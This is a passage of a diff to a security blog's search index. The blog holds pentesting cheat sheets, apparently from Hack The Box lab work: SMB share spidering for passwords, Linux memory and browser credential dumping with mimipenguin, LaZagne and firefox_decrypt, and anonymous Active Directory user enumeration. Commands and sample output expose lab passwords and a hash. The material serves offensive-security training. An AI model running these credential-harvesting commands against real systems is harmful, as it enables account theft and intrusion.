class="string">&quot;passw&quot;</span> 1 <span class="built_in">times</span></span><br><span class="line">[+] <span class="comment"># Auth backup password: INLANEFREIGHT\jbader:ILovePower333###</span></span><br></pre></td></tr></table></figure>
 
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">manspider 10.129.182.89 -c <span class="string">&#x27;INLANEFREIGHT&#x27;</span> -u <span class="string">&#x27;mendres&#x27;</span> -p <span class="string">&#x27;Inlanefreight2025!&#x27;</span></span><br><span class="line"></span><br><span class="line">[+] 10.129.182.89\IT\Tools\split_tunnel.txt: matched <span class="string">&quot;INLANEFREIGHT&quot;</span> 1 <span class="built_in">times</span></span><br><span class="line">[+] <span class="comment"># Auth backup password: INLANEFREIGHT\jbader:ILovePower333###</span></span><br></pre></td></tr></table></figure>
 
-]]></content>
+<h3 id="Netexec"><a href="#Netexec" class="headerlink" title="Netexec"></a>Netexec</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nxc smb 10.129.234.121 -u mendres -p <span class="string">&#x27;Inlanefreight2025!&#x27;</span> --spider IT --content --pattern <span class="string">&quot;passw&quot;</span></span><br><span class="line"></span><br><span class="line">SMB         10.129.234.121  445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:inlanefreight.local) (signing:True) (SMBv1:False)</span><br><span class="line">SMB         10.129.234.121  445    DC01             [+] inlanefreight.local\mendres:Inlanefreight2025! </span><br><span class="line">SMB         10.129.234.121  445    DC01             [*] Started spidering</span><br><span class="line">SMB         10.129.234.121  445    DC01             [*] Spidering .</span><br><span class="line">&lt;SNIP&gt;</span><br></pre></td></tr></table></figure>
+
+<p>We can also download the files locally:</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nxc smb 104.152.52.235 -u mendres -p Inlanefreight2025! -M spider_plus -o DOWNLOAD_FLAG=True</span><br></pre></td></tr></table></figure>
+
+<p>Then search for the pattern we want:</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /tmp/nxc_hosted/nxc_spider_plus/10.129.234.173</span><br><span class="line"></span><br><span class="line">grep -ri <span class="string">&quot;passw&quot;</span> .</span><br></pre></td></tr></table></figure>
+
+<p>Example result</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /tmp/nxc_hosted/nxc_spider_plus/10.129.234.173</span><br><span class="line"></span><br><span class="line">grep -ri <span class="string">&quot;passw&quot;</span> .</span><br><span class="line"></span><br><span class="line">Auth backup password: INLANEFREIGHT\jbader:ILovePower333###</span><br></pre></td></tr></table></figure>]]></content>
       <categories>
         <category>Active Directory</category>
-        <category>Windows</category>
-        <category>Exploitation</category>
-        <category>Cross Forest</category>
-        <category>Kerberoasting</category>
+        <category>Service-Enumeration</category>
+        <category>SMB</category>
       </categories>
       <tags>
-        <tag>PowerView</tag>
-        <tag>Rubeus</tag>
+        <tag>SMB</tag>
+        <tag>Enumeration</tag>
       </tags>
   </entry>
   <entry>
@@ -593,6 +593,42 @@
       </tags>
   </entry>
   <entry>
+    <title>Linux-Memory-Cache-Browser-Credentials-Hunting</title>
+    <url>/2025/11/27/Linux-Memory-Cache-Browser-Credentials-Hunting/</url>
+    <content><![CDATA[<h2 id="Mimipenguin-root-access-is-required"><a href="#Mimipenguin-root-access-is-required" class="headerlink" title="Mimipenguin ( root access is required )"></a>Mimipenguin ( root access is required )</h2><p>➜ Many applications and processes work with credentials needed for authentication and store them either in memory or in files so that they can be reused.</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> python3 mimipenguin.py</span><br><span class="line"></span><br><span class="line">[SYSTEM - GNOME]	cry0l1t3:WLpAEXFa0SbqOHY</span><br></pre></td></tr></table></figure>
+
+<h2 id="LaZagne-Root-recommended-but-not-always-required"><a href="#LaZagne-Root-recommended-but-not-always-required" class="headerlink" title="LaZagne ( Root recommended, but not always required )"></a>LaZagne ( Root recommended, but not always required )</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> python2.7 laZagne.py all</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">------------------- Shadow passwords -----------------</span><br><span class="line"></span><br><span class="line">[+] Hash found !!!</span><br><span class="line">Login: systemd-coredump</span><br><span class="line">Hash: !!:18858::::::</span><br><span class="line"></span><br><span class="line">[+] Hash found !!!</span><br><span class="line">Login: sambauser</span><br><span class="line">Hash: $6<span class="variable">$wgK4tGq7Jepa</span>.V0g<span class="variable">$QkxvseL</span>.xkC3jo682xhSGoXXOGcBwPLc2CrAPugD6PYXWQlBkiwwFs7x/fhI.8negiUSPqaWyv7wC8uwsWPrx1:18862:0:99999:7:::</span><br><span class="line"></span><br><span class="line">[+] Password found !!!</span><br><span class="line">Login: cry0l1t3</span><br><span class="line">Password: WLpAEXFa0SbqOHY</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[+] 3 passwords have been found.</span><br><span class="line">For more information launch it again with the -v option</span><br><span class="line"></span><br><span class="line">elapsed <span class="keyword">time</span> = 3.50091600418</span><br></pre></td></tr></table></figure>
+
+
+<p>LaZagne without root</p>
+<ul>
+<li><code>browser passwords (if user profile is readable)</code></li>
+<li><code>Git credentials</code></li>
+<li><code>SSH keys</code></li>
+<li><code>environment variables</code></li>
+<li><code>configuration files</code></li>
+</ul>
+<h2 id="Browser-redentials"><a href="#Browser-redentials" class="headerlink" title="Browser redentials"></a>Browser redentials</h2><h3 id="Firefox"><a href="#Firefox" class="headerlink" title="Firefox"></a>Firefox</h3><h4 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a>Enumeration</h4><p>By default, Firefox stores saved credentials in an encrypted file named <code>logins.json</code>.</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ls -l .mozilla/firefox/ | grep default </span><br><span class="line"></span><br><span class="line">drwx------ 11 cry0l1t3 cry0l1t3 4096 Jan 28 16:02 1bplpd86.default-release</span><br><span class="line">drwx------  2 cry0l1t3 cry0l1t3 4096 Jan 28 13:30 lfx3lvhb.default</span><br></pre></td></tr></table></figure>
+
+
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> .mozilla/firefox/1bplpd86.default-release/logins.json | jq .</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;nextId&quot;</span>: 2,</span><br><span class="line">  <span class="string">&quot;logins&quot;</span>: [</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="string">&quot;id&quot;</span>: 1,</span><br><span class="line">      <span class="string">&quot;hostname&quot;</span>: <span class="string">&quot;https://www.inlanefreight.com&quot;</span>,</span><br><span class="line">      <span class="string">&quot;httpRealm&quot;</span>: null,</span><br><span class="line">      <span class="string">&quot;formSubmitURL&quot;</span>: <span class="string">&quot;https://www.inlanefreight.com&quot;</span>,</span><br><span class="line">      <span class="string">&quot;usernameField&quot;</span>: <span class="string">&quot;username&quot;</span>,</span><br><span class="line">      <span class="string">&quot;passwordField&quot;</span>: <span class="string">&quot;password&quot;</span>,</span><br><span class="line">      <span class="string">&quot;encryptedUsername&quot;</span>: <span class="string">&quot;MDoEEPgAAAA...SNIP...1liQiqBBAG/8/UpqwNlEPScm0uecyr&quot;</span>,</span><br><span class="line">      <span class="string">&quot;encryptedPassword&quot;</span>: <span class="string">&quot;MEIEEPgAAAA...SNIP...FrESc4A3OOBBiyS2HR98xsmlrMCRcX2T9Pm14PMp3bpmE=&quot;</span>,</span><br><span class="line">      <span class="string">&quot;guid&quot;</span>: <span class="string">&quot;&#123;412629aa-4113-4ff9-befe-dd9b4ca388e2&#125;&quot;</span>,</span><br><span class="line">      <span class="string">&quot;encType&quot;</span>: 1,</span><br><span class="line">      <span class="string">&quot;timeCreated&quot;</span>: 1643373110869,</span><br><span class="line">      <span class="string">&quot;timeLastUsed&quot;</span>: 1643373110869,</span><br><span class="line">      <span class="string">&quot;timePasswordChanged&quot;</span>: 1643373110869,</span><br><span class="line">      <span class="string">&quot;timesUsed&quot;</span>: 1</span><br><span class="line">    &#125;</span><br><span class="line">  ],</span><br><span class="line">  <span class="string">&quot;potentiallyVulnerablePasswords&quot;</span>: [],</span><br><span class="line">  <span class="string">&quot;dismissedBreachAlertsByLoginGUID&quot;</span>: &#123;&#125;,</span><br><span class="line">  <span class="string">&quot;version&quot;</span>: 3</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h4 id="Decrypt"><a href="#Decrypt" class="headerlink" title="Decrypt"></a>Decrypt</h4><p>To decrypt saved credentials we can use <a href="https://github.com/unode/firefox_decrypt">firefox_decrypt</a></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3.9 firefox_decrypt.py</span><br><span class="line"></span><br><span class="line">Select the Mozilla profile you wish to decrypt</span><br><span class="line">1 -&gt; lfx3lvhb.default</span><br><span class="line">2 -&gt; 1bplpd86.default-release</span><br><span class="line"></span><br><span class="line">2</span><br><span class="line"></span><br><span class="line">Website:   https://testing.dev.inlanefreight.com</span><br><span class="line">Username: <span class="string">&#x27;test&#x27;</span></span><br><span class="line">Password: <span class="string">&#x27;test&#x27;</span></span><br><span class="line"></span><br><span class="line">Website:   https://www.inlanefreight.com</span><br><span class="line">Username: <span class="string">&#x27;cry0l1t3&#x27;</span></span><br><span class="line">Password: <span class="string">&#x27;FzXUxJemKm6g2lGh&#x27;</span></span><br></pre></td></tr></table></figure>]]></content>
+      <categories>
+        <category>Active Directory</category>
+        <category>Linux</category>
+        <category>Post Exploitation</category>
+        <category>Credential Hunting</category>
+      </categories>
+      <tags>
+        <tag>browser-credentials</tag>
+        <tag>LaZagne</tag>
+        <tag>Mimipenguin</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Linux Credential Hunting</title>
     <url>/2025/11/27/Linux-Credential-Hunting/</url>
     <content><![CDATA[<h1 id="Linux-Credential-Hunting"><a href="#Linux-Credential-Hunting" class="headerlink" title="Linux Credential Hunting"></a>Linux Credential Hunting</h1><h3 id="Enumerating-history-files"><a href="#Enumerating-history-files" class="headerlink" title="Enumerating history files"></a>Enumerating history files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">tail</span> -n10 /home/*/.bash*</span><br></pre></td></tr></table></figure>
@@ -631,42 +667,6 @@
       </tags>
   </entry>
   <entry>
-    <title>Linux-Memory-Cache-Browser-Credentials-Hunting</title>
-    <url>/2025/11/27/Linux-Memory-Cache-Browser-Credentials-Hunting/</url>
-    <content><![CDATA[<h2 id="Mimipenguin-root-access-is-required"><a href="#Mimipenguin-root-access-is-required" class="headerlink" title="Mimipenguin ( root access is required )"></a>Mimipenguin ( root access is required )</h2><p>➜ Many applications and processes work with credentials needed for authentication and store them either in memory or in files so that they can be reused.</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> python3 mimipenguin.py</span><br><span class="line"></span><br><span class="line">[SYSTEM - GNOME]	cry0l1t3:WLpAEXFa0SbqOHY</span><br></pre></td></tr></table></figure>
-
-<h2 id="LaZagne-Root-recommended-but-not-always-required"><a href="#LaZagne-Root-recommended-but-not-always-required" class="headerlink" title="LaZagne ( Root recommended, but not always required )"></a>LaZagne ( Root recommended, but not always required )</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> python2.7 laZagne.py all</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">------------------- Shadow passwords -----------------</span><br><span class="line"></span><br><span class="line">[+] Hash found !!!</span><br><span class="line">Login: systemd-coredump</span><br><span class="line">Hash: !!:18858::::::</span><br><span class="line"></span><br><span class="line">[+] Hash found !!!</span><br><span class="line">Login: sambauser</span><br><span class="line">Hash: $6<span class="variable">$wgK4tGq7Jepa</span>.V0g<span class="variable">$QkxvseL</span>.xkC3jo682xhSGoXXOGcBwPLc2CrAPugD6PYXWQlBkiwwFs7x/fhI.8negiUSPqaWyv7wC8uwsWPrx1:18862:0:99999:7:::</span><br><span class="line"></span><br><span class="line">[+] Password found !!!</span><br><span class="line">Login: cry0l1t3</span><br><span class="line">Password: WLpAEXFa0SbqOHY</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[+] 3 passwords have been found.</span><br><span class="line">For more information launch it again with the -v option</span><br><span class="line"></span><br><span class="line">elapsed <span class="keyword">time</span> = 3.50091600418</span><br></pre></td></tr></table></figure>
-
-
-<p>LaZagne without root</p>
-<ul>
-<li><code>browser passwords (if user profile is readable)</code></li>
-<li><code>Git credentials</code></li>
-<li><code>SSH keys</code></li>
-<li><code>environment variables</code></li>
-<li><code>configuration files</code></li>
-</ul>
-<h2 id="Browser-redentials"><a href="#Browser-redentials" class="headerlink" title="Browser redentials"></a>Browser redentials</h2><h3 id="Firefox"><a href="#Firefox" class="headerlink" title="Firefox"></a>Firefox</h3><h4 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a>Enumeration</h4><p>By default, Firefox stores saved credentials in an encrypted file named <code>logins.json</code>.</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ls -l .mozilla/firefox/ | grep default </span><br><span class="line"></span><br><span class="line">drwx------ 11 cry0l1t3 cry0l1t3 4096 Jan 28 16:02 1bplpd86.default-release</span><br><span class="line">drwx------  2 cry0l1t3 cry0l1t3 4096 Jan 28 13:30 lfx3lvhb.default</span><br></pre></td></tr></table></figure>
-
-
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> .mozilla/firefox/1bplpd86.default-release/logins.json | jq .</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;nextId&quot;</span>: 2,</span><br><span class="line">  <span class="string">&quot;logins&quot;</span>: [</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="string">&quot;id&quot;</span>: 1,</span><br><span class="line">      <span class="string">&quot;hostname&quot;</span>: <span class="string">&quot;https://www.inlanefreight.com&quot;</span>,</span><br><span class="line">      <span class="string">&quot;httpRealm&quot;</span>: null,</span><br><span class="line">      <span class="string">&quot;formSubmitURL&quot;</span>: <span class="string">&quot;https://www.inlanefreight.com&quot;</span>,</span><br><span class="line">      <span class="string">&quot;usernameField&quot;</span>: <span class="string">&quot;username&quot;</span>,</span><br><span class="line">      <span class="string">&quot;passwordField&quot;</span>: <span class="string">&quot;password&quot;</span>,</span><br><span class="line">      <span class="string">&quot;encryptedUsername&quot;</span>: <span class="string">&quot;MDoEEPgAAAA...SNIP...1liQiqBBAG/8/UpqwNlEPScm0uecyr&quot;</span>,</span><br><span class="line">      <span class="string">&quot;encryptedPassword&quot;</span>: <span class="string">&quot;MEIEEPgAAAA...SNIP...FrESc4A3OOBBiyS2HR98xsmlrMCRcX2T9Pm14PMp3bpmE=&quot;</span>,</span><br><span class="line">      <span class="string">&quot;guid&quot;</span>: <span class="string">&quot;&#123;412629aa-4113-4ff9-befe-dd9b4ca388e2&#125;&quot;</span>,</span><br><span class="line">      <span class="string">&quot;encType&quot;</span>: 1,</span><br><span class="line">      <span class="string">&quot;timeCreated&quot;</span>: 1643373110869,</span><br><span class="line">      <span class="string">&quot;timeLastUsed&quot;</span>: 1643373110869,</span><br><span class="line">      <span class="string">&quot;timePasswordChanged&quot;</span>: 1643373110869,</span><br><span class="line">      <span class="string">&quot;timesUsed&quot;</span>: 1</span><br><span class="line">    &#125;</span><br><span class="line">  ],</span><br><span class="line">  <span class="string">&quot;potentiallyVulnerablePasswords&quot;</span>: [],</span><br><span class="line">  <span class="string">&quot;dismissedBreachAlertsByLoginGUID&quot;</span>: &#123;&#125;,</span><br><span class="line">  <span class="string">&quot;version&quot;</span>: 3</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<h4 id="Decrypt"><a href="#Decrypt" class="headerlink" title="Decrypt"></a>Decrypt</h4><p>To decrypt saved credentials we can use <a href="https://github.com/unode/firefox_decrypt">firefox_decrypt</a></p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3.9 firefox_decrypt.py</span><br><span class="line"></span><br><span class="line">Select the Mozilla profile you wish to decrypt</span><br><span class="line">1 -&gt; lfx3lvhb.default</span><br><span class="line">2 -&gt; 1bplpd86.default-release</span><br><span class="line"></span><br><span class="line">2</span><br><span class="line"></span><br><span class="line">Website:   https://testing.dev.inlanefreight.com</span><br><span class="line">Username: <span class="string">&#x27;test&#x27;</span></span><br><span class="line">Password: <span class="string">&#x27;test&#x27;</span></span><br><span class="line"></span><br><span class="line">Website:   https://www.inlanefreight.com</span><br><span class="line">Username: <span class="string">&#x27;cry0l1t3&#x27;</span></span><br><span class="line">Password: <span class="string">&#x27;FzXUxJemKm6g2lGh&#x27;</span></span><br></pre></td></tr></table></figure>]]></content>
-      <categories>
-        <category>Active Directory</category>
-        <category>Linux</category>
-        <category>Post Exploitation</category>
-        <category>Credential Hunting</category>
-      </categories>
-      <tags>
-        <tag>browser-credentials</tag>
-        <tag>LaZagne</tag>
-        <tag>Mimipenguin</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Linux Pass the Hash (PtH)</title>
     <url>/2025/11/27/Linux-Pass-the-Hash-PtH/</url>
     <content><![CDATA[<h1 id="NetExec"><a href="#NetExec" class="headerlink" title="NetExec"></a>NetExec</h1><h3 id="Domain-Account"><a href="#Domain-Account" class="headerlink" title="Domain Account"></a>Domain Account</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">netexec smb ip -u username -d Domain -H <span class="built_in">hash</span></span><br></pre></td></tr></table></figure>
@@ -698,57 +698,39 @@
       </tags>
   </entry>
   <entry>
-    <title>Mssql Enumeration</title>
-    <url>/2025/11/20/Mssql-Enumeration/</url>
-    <content><![CDATA[<h1 id="Connect-To-The-Data-Base"><a href="#Connect-To-The-Data-Base" class="headerlink" title="Connect To The Data Base"></a>Connect To The Data Base</h1><h2 id="SQL-Authentication"><a href="#SQL-Authentication" class="headerlink" title="SQL Authentication"></a>SQL Authentication</h2><h3 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h3><h5 id="sqlcmd"><a href="#sqlcmd" class="headerlink" title="sqlcmd"></a>sqlcmd</h5><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">sqlcmd -S target -U username -P &#x27;password&#x27; -y <span class="number">30</span> -Y <span class="number">30</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h3><h5 id="sqsh"><a href="#sqsh" class="headerlink" title="sqsh"></a>sqsh</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqsh -S target -U username -P <span class="string">&#x27;password&#x27;</span> -h</span><br></pre></td></tr></table></figure>
-
-<h5 id="mssqlclient"><a href="#mssqlclient" class="headerlink" title="mssqlclient"></a>mssqlclient</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">impacket-mssqlclient username@target</span><br></pre></td></tr></table></figure>
+    <title>Making a Target User List</title>
+    <url>/2025/12/03/Making-a-Target-User-List/</url>
+    <content><![CDATA[<h2 id="SMB-NULL-Session"><a href="#SMB-NULL-Session" class="headerlink" title="SMB NULL Session"></a>SMB NULL Session</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">kerbrute userenum --dc dc-ip -d Domain wordlist.txt</span><br></pre></td></tr></table></figure>
 
 
-
-<h2 id="Windows-Authentication-Local-Account"><a href="#Windows-Authentication-Local-Account" class="headerlink" title="Windows Authentication (Local Account)"></a>Windows Authentication (Local Account)</h2><h3 id="Linux-1"><a href="#Linux-1" class="headerlink" title="Linux"></a>Linux</h3><h5 id="sqsh-1"><a href="#sqsh-1" class="headerlink" title="sqsh"></a>sqsh</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqsh -S target -U .\\username -P <span class="string">&#x27;password&#x27;</span> -h</span><br></pre></td></tr></table></figure>
-
-
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqsh -S target -U HOSTNAME\\username -P <span class="string">&#x27;password&#x27;</span> -h</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">enum4linux -U dc-ip  | grep <span class="string">&quot;user:&quot;</span> | <span class="built_in">cut</span> -f2 -d<span class="string">&quot;[&quot;</span> | <span class="built_in">cut</span> -f1 -d<span class="string">&quot;]&quot;</span></span><br></pre></td></tr></table></figure>
 
 
-<h5 id="mssqlclient-1"><a href="#mssqlclient-1" class="headerlink" title="mssqlclient"></a>mssqlclient</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">impacket-mssqlclient username@target -windows-auth</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rpcclient -U <span class="string">&quot;&quot;</span> -N dc-ip</span><br><span class="line"></span><br><span class="line">rpcclient&gt; enumdomusers </span><br></pre></td></tr></table></figure>
 
 
-<h2 id="Domain-Authentication-With-DC"><a href="#Domain-Authentication-With-DC" class="headerlink" title="Domain Authentication (With DC)"></a>Domain Authentication (With DC)</h2><h3 id="Linux-2"><a href="#Linux-2" class="headerlink" title="Linux"></a>Linux</h3><h5 id="sqsh-2"><a href="#sqsh-2" class="headerlink" title="sqsh"></a>sqsh</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sqsh -S target -U domain\username -P password</span><br></pre></td></tr></table></figure>
-
-<h5 id="mssqlclient-2"><a href="#mssqlclient-2" class="headerlink" title="mssqlclient"></a>mssqlclient</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">impacket-mssqlclient domain/username:password@target</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nxc smb dc-ip -u <span class="string">&#x27;&#x27;</span> -p <span class="string">&#x27;&#x27;</span> --<span class="built_in">users</span></span><br></pre></td></tr></table></figure>
 
 
-<h1 id="Enumerate-Data-Base"><a href="#Enumerate-Data-Base" class="headerlink" title="Enumerate Data Base"></a>Enumerate Data Base</h1><h2 id="Windows-1"><a href="#Windows-1" class="headerlink" title="Windows"></a>Windows</h2><h3 id="sqlcmd-1"><a href="#sqlcmd-1" class="headerlink" title="sqlcmd"></a>sqlcmd</h3><p>When using <code>sqlcmd</code>, each query must be followed by <code>GO</code> to trigger its execution.</p>
-<h5 id="List-Databases"><a href="#List-Databases" class="headerlink" title="List Databases"></a>List Databases</h5><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>&gt; <span class="built_in">SELECT</span> name FROM master.dbo.sysdatabases</span><br><span class="line"><span class="number">2</span>&gt; GO</span><br></pre></td></tr></table></figure>
-
-<h5 id="Select-Database"><a href="#Select-Database" class="headerlink" title="Select Database"></a>Select Database</h5><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>&gt; USE htbusers</span><br><span class="line"><span class="number">2</span>&gt; GO</span><br></pre></td></tr></table></figure>
-
-<h5 id="List-Tables"><a href="#List-Tables" class="headerlink" title="List Tables"></a>List Tables</h5><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>&gt; <span class="built_in">SELECT</span> table_name FROM htbusers.INFORMATION_SCHEMA.TABLES</span><br><span class="line"><span class="number">2</span>&gt; GO</span><br></pre></td></tr></table></figure>
-
-<h5 id="Dump-Specific-Table"><a href="#Dump-Specific-Table" class="headerlink" title="Dump Specific Table"></a>Dump Specific Table</h5><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>&gt; <span class="built_in">SELECT</span> * FROM users</span><br><span class="line"><span class="number">2</span>&gt; go</span><br></pre></td></tr></table></figure>
-
-<h2 id="Linux-3"><a href="#Linux-3" class="headerlink" title="Linux"></a>Linux</h2><h3 id="Mssqlclient"><a href="#Mssqlclient" class="headerlink" title="Mssqlclient"></a>Mssqlclient</h3><h5 id="List-Databases-1"><a href="#List-Databases-1" class="headerlink" title="List Databases"></a>List Databases</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">SQL (htbdbuser  guest@master)&gt; SELECT name FROM sys.databases;</span><br></pre></td></tr></table></figure>
+<h2 id="LDAP-Anonymous"><a href="#LDAP-Anonymous" class="headerlink" title="LDAP Anonymous"></a>LDAP Anonymous</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Step 1: Get Base DN  </span></span><br><span class="line">  </span><br><span class="line">ldapsearch -x -H ldap://&lt;DC_IP&gt; -s base namingcontexts  </span><br><span class="line">  </span><br><span class="line"><span class="comment"># Step 2: Use Base DN to retrieve list of users</span></span><br><span class="line"></span><br><span class="line">ldapsearch -h dc-ip -x -b <span class="string">&quot;&lt;BASE_DN&gt;&quot;</span> -s sub <span class="string">&quot;(&amp;(objectclass=user))&quot;</span>  | grep sAMAccountName: | <span class="built_in">cut</span> -f2 -d<span class="string">&quot; &quot;</span></span><br></pre></td></tr></table></figure>
 
 
-<h5 id="Select-Database-1"><a href="#Select-Database-1" class="headerlink" title="Select Database"></a>Select Database</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">SQL (htbdbuser  guest@master)&gt; use database-name</span><br></pre></td></tr></table></figure>
 
-<h5 id="List-Tables-1"><a href="#List-Tables-1" class="headerlink" title="List Tables"></a>List Tables</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">SELECT TABLE_SCHEMA, TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE=<span class="string">&#x27;BASE TABLE&#x27;</span> ORDER BY TABLE_SCHEMA, TABLE_NAME;</span><br></pre></td></tr></table></figure>
-
-<h5 id="Dump-Specific-Table-1"><a href="#Dump-Specific-Table-1" class="headerlink" title="Dump Specific Table"></a>Dump Specific Table</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mysql&gt; SELECT * FROM table-name;</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./windapsearch.py --dc-ip &lt;DC_IP&gt; -u <span class="string">&quot;&quot;</span> -U</span><br></pre></td></tr></table></figure>
 
 ]]></content>
       <categories>
         <category>Active Directory</category>
-        <category>Service-Enumeration</category>
-        <category>MSSQL</category>
+        <category>Enumeration</category>
+        <category>Users &amp; Passwords Enumeration</category>
+        <category>Making a Target User List</category>
       </categories>
       <tags>
-        <tag>Enumeration</tag>
-        <tag>MSSQL</tag>
+        <tag>netexec</tag>
+        <tag>rpcclient</tag>
+        <tag>ldapsearch</tag>
+        <tag>enum4linux-ng</tag>
+        <tag>windapsearch</tag>
       </tags>
   </entry>
   <entry>
@@ -868,39 +850,57 @@
       </tags>
   </entry>
   <entry>
-    <title>Making a Target User List</title>
-    <url>/2025/12/03/Making-a-Target-User-List/</url>
-    <content><![CDATA[<h2 id="SMB-NULL-Session"><a href="#SMB-NULL-Session" class="headerlink" title="SMB NULL Session"></a>SMB NULL Session</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">kerbrute userenum --dc dc-ip -d Domain wordlist.txt</span><br></pre></td></tr></table></figure>
+    <title>Mssql Enumeration</title>
+    <url>/2025/11/20/Mssql-Enumeration/</url>
+    <content><![CDATA[<h1 id="Connect-To-The-Data-Base"><a href="#Connect-To-The-Data-Base" class="headerlink" title="Connect To The Data Base"></a>Connect To The Data Base</h1><h2 id="SQL-Authentication"><a href="#SQL-Authentication" class="headerlink" title="SQL Authentication"></a>SQL Authentication</h2><h3 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h3><h5 id="sqlcmd"><a href="#sqlcmd" class="headerlink" title="sqlcmd"></a>sqlcmd</h5><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">sqlcmd -S target -U username -P &#x27;password&#x27; -y <span class="number">30</span> -Y <span class="number">30</span></span><br></pre></td></tr></table></figure>
 
+<h3 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h3><h5 id="sqsh"><a href="#sqsh" class="headerlink" title="sqsh"></a>sqsh</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqsh -S target -U username -P <span class="string">&#x27;password&#x27;</span> -h</span><br></pre></td></tr></table></figure>
 
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">enum4linux -U dc-ip  | grep <span class="string">&quot;user:&quot;</span> | <span class="built_in">cut</span> -f2 -d<span class="string">&quot;[&quot;</span> | <span class="built_in">cut</span> -f1 -d<span class="string">&quot;]&quot;</span></span><br></pre></td></tr></table></figure>
-
-
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rpcclient -U <span class="string">&quot;&quot;</span> -N dc-ip</span><br><span class="line"></span><br><span class="line">rpcclient&gt; enumdomusers </span><br></pre></td></tr></table></figure>
-
-
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nxc smb dc-ip -u <span class="string">&#x27;&#x27;</span> -p <span class="string">&#x27;&#x27;</span> --<span class="built_in">users</span></span><br></pre></td></tr></table></figure>
-
-
-<h2 id="LDAP-Anonymous"><a href="#LDAP-Anonymous" class="headerlink" title="LDAP Anonymous"></a>LDAP Anonymous</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Step 1: Get Base DN  </span></span><br><span class="line">  </span><br><span class="line">ldapsearch -x -H ldap://&lt;DC_IP&gt; -s base namingcontexts  </span><br><span class="line">  </span><br><span class="line"><span class="comment"># Step 2: Use Base DN to retrieve list of users</span></span><br><span class="line"></span><br><span class="line">ldapsearch -h dc-ip -x -b <span class="string">&quot;&lt;BASE_DN&gt;&quot;</span> -s sub <span class="string">&quot;(&amp;(objectclass=user))&quot;</span>  | grep sAMAccountName: | <span class="built_in">cut</span> -f2 -d<span class="string">&quot; &quot;</span></span><br></pre></td></tr></table></figure>
